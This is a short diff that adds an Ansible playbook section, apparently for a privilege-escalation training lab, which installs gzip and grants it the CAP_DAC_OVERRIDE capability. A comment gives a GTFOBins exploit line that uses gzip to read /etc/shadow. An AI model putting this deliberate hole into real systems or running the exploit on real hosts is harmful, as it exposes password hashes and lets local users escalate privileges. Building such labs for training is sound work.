@@ -1,0 +1,12 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/gzip/#capabilities
+# Exploit: LFILE=/etc/shadow; gzip -f $LFILE -t
+- name: (privesc/cap_gzip) Install gzip
+  ansible.builtin.apt:
+    name: gzip
+    state: present
+    update_cache: true
+
+- name: (privesc/cap_gzip) Set CAP_DAC_OVERRIDE on /usr/bin/gzip
+  ansible.builtin.command: setcap cap_dac_override+eip /usr/bin/gzip
+  changed_when: true
